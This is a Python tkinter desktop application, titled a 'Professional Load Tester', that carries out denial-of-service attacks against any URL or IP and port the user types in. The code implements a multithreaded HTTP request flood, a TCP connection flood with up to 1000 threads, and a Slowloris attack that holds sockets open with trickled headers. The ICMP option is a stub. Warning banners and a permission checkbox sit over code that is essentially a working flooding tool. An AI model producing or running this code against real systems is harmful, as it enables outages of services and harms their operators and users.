import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import socket
import requests
import time
from datetime import datetime
import json
import os

class LoadTesterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Professional Load Tester v1.0 - Ethical Use Only")
        self.root.geometry("900x700")
        self.root.resizable(True, True)
        
        self.target_url = tk.StringVar()
        self.target_ip = tk.StringVar()
        self.port = tk.IntVar(value=80)
        self.threads = tk.IntVar(value=100)
        self.duration = tk.IntVar(value=30)
        self.attack_type = tk.StringVar(value="HTTP")
        self.is_running = False
        self.stop_flag = False
        
        self.setup_ui()
        
    def setup_ui(self):
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        warning_frame = ttk.Frame(main_frame, relief="solid", borderwidth=2)
        warning_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        warning_label = ttk.Label(warning_frame, 
                                 text="⚠️ WARNING: Use only on authorized systems! Unauthorized use is a crime. ⚠️",
                                 foreground="red", font=("Arial", 10, "bold"))
        warning_label.pack(pady=5)
        
        target_frame = ttk.LabelFrame(main_frame, text="Target Configuration", padding="10")
        target_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        ttk.Label(target_frame, text="Target URL (HTTP/HTTPS):").grid(row=0, column=0, sticky=tk.W, pady=5)
        ttk.Entry(target_frame, textvariable=self.target_url, width=50).grid(row=0, column=1, sticky=(tk.W, tk.E), pady=5, padx=(5, 0))
        
        ttk.Label(target_frame, text="Target IP:").grid(row=1, column=0, sticky=tk.W, pady=5)
        ttk.Entry(target_frame, textvariable=self.target_ip, width=50).grid(row=1, column=1, sticky=(tk.W, tk.E), pady=5, padx=(5, 0))
        
        ttk.Label(target_frame, text="Port:").grid(row=2, column=0, sticky=tk.W, pady=5)
        ttk.Spinbox(target_frame, from_=1, to=65535, textvariable=self.port, width=20).grid(row=2, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        attack_frame = ttk.LabelFrame(main_frame, text="Attack Configuration", padding="10")
        attack_frame.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        ttk.Label(attack_frame, text="Test Type:").grid(row=0, column=0, sticky=tk.W, pady=5)
        attack_combo = ttk.Combobox(attack_frame, textvariable=self.attack_type, 
                                   values=["HTTP", "TCP", "Slow Loris", "ICMP"], state="readonly")
        attack_combo.grid(row=0, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        ttk.Label(attack_frame, text="Threads (1-1000):").grid(row=1, column=0, sticky=tk.W, pady=5)
        ttk.Spinbox(attack_frame, from_=1, to=1000, textvariable=self.threads, width=20).grid(row=1, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        ttk.Label(attack_frame, text="Duration (seconds):").grid(row=2, column=0, sticky=tk.W, pady=5)
        ttk.Spinbox(attack_frame, from_=5, to=3600, textvariable=self.duration, width=20).grid(row=2, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=3, column=0, columnspan=2, pady=10)
        
        self.start_btn = ttk.Button(button_frame, text="START TEST", command=self.start_attack, width=15)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(button_frame, text="STOP", command=self.stop_attack, state=tk.DISABLED, width=15)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(button_frame, text="Clear Log", command=self.clear_log, width=15).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Save Report", command=self.save_report, width=15).pack(side=tk.LEFT, padx=5)
        
        log_frame = ttk.LabelFrame(main_frame, text="Test Log", padding="10")
        log_frame.grid(row=4, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(10, 0))
        
        self.log_text = scrolledtext.ScrolledText(log_frame, width=100, height=20, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        self.status_var = tk.StringVar(value="Ready")
        status_bar = ttk.Label(self.root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        status_bar.grid(row=1, column=0, sticky=(tk.W, tk.E))
        
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(4, weight=1)
        
        self.log("Professional Load Tester initialized - Use ethically only!")
        
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color_tags = {"INFO": "black", "WARNING": "orange", "ERROR": "red", "SUCCESS": "green"}
        color = color_tags.get(level, "black")
        
        self.log_text.insert(tk.END, f"[{timestamp}] [{level}] {message}\n", color)
        self.log_text.see(tk.END)
        
        self.log_text.tag_config("orange", foreground="orange")
        self.log_text.tag_config("red", foreground="red")
        self.log_text.tag_config("green", foreground="green")
        self.log_text.tag_config("black", foreground="black")
        
    def clear_log(self):
        self.log_text.delete(1.0, tk.END)
        
    def save_report(self):
        filename = filedialog.asksaveasfilename(defaultextension=".txt", 
                                               filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(self.log_text.get(1.0, tk.END))
            self.log(f"Report saved to {filename}", "SUCCESS")
            
    def start_attack(self):
        if not self.target_url.get() and not self.target_ip.get():
            messagebox.showerror("Error", "Please enter Target URL or IP!")
            return
            
        if self.threads.get() > 500:
            result = messagebox.askyesno("Warning", "High thread count may crash your system. Continue?")
            if not result:
                return
        
        if not messagebox.askyesno("Ethical Confirmation", 
                                   "Do you have WRITTEN PERMISSION to test this target?\n\n"
                                   "Unauthorized testing is ILLEGAL and may result in:\n"
                                   "- Criminal charges\n- Prison time\n- Heavy fines\n\n"
                                   "Proceed only if you have authorization!"):
            return
            
        self.is_running = True
        self.stop_flag = False
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        
        self.log(f"Starting test on {self.target_url.get() or self.target_ip.get()}", "WARNING")
        self.log(f"Threads: {self.threads.get()}, Duration: {self.duration.get()}s, Type: {self.attack_type.get()}", "INFO")
        
        attack_thread = threading.Thread(target=self.run_attack)
        attack_thread.daemon = True
        attack_thread.start()
        
    def stop_attack(self):
        self.stop_flag = True
        self.log("Stopping test...", "WARNING")
        
    def run_attack(self):
        attack_methods = {
            "HTTP": self.http_flood,
            "TCP": self.tcp_flood,
            "Slow Loris": self.slowloris_attack,
            "ICMP": self.icmp_flood
        }
        
        method = attack_methods.get(self.attack_type.get(), self.http_flood)
        method()
        
        self.is_running = False
        self.root.after(0, self.attack_finished)
        
    def attack_finished(self):
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.log("Test completed", "SUCCESS")
        self.status_var.set("Ready")
        
    def http_flood(self):
        url = self.target_url.get()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        self.status_var.set("HTTP flood in progress...")
        
        def send_request():
            while not self.stop_flag:
                try:
                    response = requests.get(url, timeout=1, headers={'User-Agent': 'Load-Tester/1.0'})
                    self.log(f"HTTP {response.status_code} - {url[:50]}", "INFO")
                except Exception as e:
                    if not self.stop_flag:
                        self.log(f"HTTP Error: {str(e)[:100]}", "ERROR")
                time.sleep(0.01)
                
        threads = []
        for i in range(min(self.threads.get(), 200)):
            t = threading.Thread(target=send_request)
            t.daemon = True
            t.start()
            threads.append(t)
            
        time.sleep(self.duration.get())
        self.stop_flag = True
        
    def tcp_flood(self):
        ip = self.target_ip.get()
        port = self.port.get()
        
        self.status_var.set("TCP flood in progress...")
        
        def tcp_connect():
            while not self.stop_flag:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect((ip, port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
                    sock.close()
                except:
                    pass
                    
        threads = []
        for i in range(self.threads.get()):
            t = threading.Thread(target=tcp_connect)
            t.daemon = True
            t.start()
            threads.append(t)
            
        time.sleep(self.duration.get())
        self.stop_flag = True
        
    def slowloris_attack(self):
        ip = self.target_ip.get()
        port = self.port.get()
        
        self.status_var.set("Slow Loris test in progress...")
        
        def slowloris():
            socks = []
            for _ in range(100):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((ip, port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: test\r\n")
                    socks.append(sock)
                except:
                    pass
                    
            while not self.stop_flag:
                for sock in socks:
                    try:
                        sock.send(b"X-header: keep-alive\r\n")
                    except:
                        socks.remove(sock)
                time.sleep(10)
                
        threads = []
        for i in range(min(self.threads.get(), 50)):
            t = threading.Thread(target=slowloris)
            t.daemon = True
            t.start()
            threads.append(t)
            
        time.sleep(self.duration.get())
        self.stop_flag = True
        
    def icmp_flood(self):
        self.log("ICMP flood requires admin/root privileges", "WARNING")
        self.log("Skipping ICMP test - use specialized tools instead", "INFO")
        time.sleep(1)

if __name__ == "__main__":
    root = tk.Tk()
    app = LoadTesterGUI(root)
    root.mainloop()

